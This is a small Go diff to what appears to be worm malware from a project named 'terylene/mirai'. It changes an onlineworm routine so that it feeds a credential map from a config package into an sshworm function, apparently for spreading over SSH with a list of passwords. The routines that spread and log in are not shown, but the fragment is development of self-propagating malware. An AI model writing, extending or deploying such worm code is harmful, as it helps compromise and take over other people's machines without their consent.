@@ -4,6 +4,7 @@ import (
 	"math/rand"
 	"time"
 	skills "terylene/mirai/components/skills"
+	myconfig "terylene/config"
 )
 
 func onlineworm() {
@@ -22,7 +23,7 @@ func onlineworm() {
 			}
 		}
 
-		sshworm(active, passwordMap)
+		sshworm(active, myconfig.PasswordMap)
 
 	}
 }
